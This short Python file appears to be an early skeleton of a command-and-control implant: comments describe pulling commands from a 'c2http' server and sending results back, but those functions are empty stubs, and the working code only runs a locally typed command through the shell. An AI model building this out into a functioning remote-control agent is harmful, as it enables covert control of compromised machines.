from subprocess import check_output as cmd_ouput


def tmp_get_cmd():
    # todo: remove this when c2http.py is working
    return input("Type CMD > ")


def get_cmd_from_c2http():
    # Connect to c2http server and pull/rcv commands
    pass


def execute_cmd(cmd):
    # todo: put in simple exception handling
    return cmd_ouput(cmd, shell=True)

def send_result_to_c2http():
    # Send encoded results back to server
    pass

def main():
    cmd = tmp_get_cmd()
    cmdout = execute_cmd(cmd)
    print(cmdout.decode())


if __name__ == '__main__':
    main()
